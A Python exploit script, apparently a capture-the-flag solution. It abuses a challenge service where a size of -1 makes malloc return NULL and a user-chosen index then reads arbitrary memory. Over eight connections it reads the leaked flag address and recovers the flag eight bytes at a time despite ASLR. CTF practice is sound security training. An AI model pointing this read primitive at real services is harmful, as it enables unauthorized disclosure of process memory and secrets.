#!/usr/bin/env python3
# usage: python3 solve.py <HOST> <PORT>
import socket, struct, re, sys

TIMEOUT = 5


def recv_until(sock, token):
    data = b""
    while token not in data:
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def leak_block(host, port, i):
    """One connection: read the leaked FLAG address, then read the i-th
    8-byte word of the flag. The address is re-read every connection
    because ASLR moves it each time."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((host, port))
    head = recv_until(sock, b"size> ")
    flag_addr = int(re.search(rb"flag: (0x[0-9a-f]+)", head).group(1), 16)
    index = flag_addr // 8 + i          # NULL-based index -> read *(index*8)
    sock.sendall(b"-1\n")               # huge size -> malloc returns NULL
    recv_until(sock, b"index> ")
    sock.sendall(f"{index}\n".encode())
    rest = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            rest += chunk
    except socket.timeout:
        pass
    sock.close()
    m = re.search(rb"(0x[0-9a-f]+)\n", rest)
    if not m:
        return {}
    val = int(m.group(1), 16)
    qb = struct.pack("<Q", val)
    out = {}
    for j in range(8):
        off = index * 8 + j - flag_addr
        if 0 <= off < 64:
            out[off] = qb[j:j + 1]
    return out


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    flag_bytes = {}
    for i in range(8):
        flag_bytes.update(leak_block(host, port, i))
    if not flag_bytes:
        print("failed to recover flag")
        return
    raw = b"".join(flag_bytes.get(k, b"?") for k in range(max(flag_bytes) + 1))
    print(raw.split(b"\x00")[0].decode(errors="ignore"))


if __name__ == "__main__":
    main()
